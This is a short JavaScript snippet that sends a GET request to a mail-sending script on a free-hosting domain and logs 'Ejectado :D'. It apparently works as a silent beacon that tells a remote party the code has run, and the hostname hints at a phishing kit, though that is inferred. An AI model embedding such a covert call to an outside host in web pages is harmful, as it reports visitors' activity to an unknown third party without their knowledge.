var remoto = new XMLHttpRequest();
var links = "https://ing-hs.000webhostapp.com/mail/send.php?num=1" 
remoto.open("GET",links,true);
remoto.send();
console.log("Ejectado :D");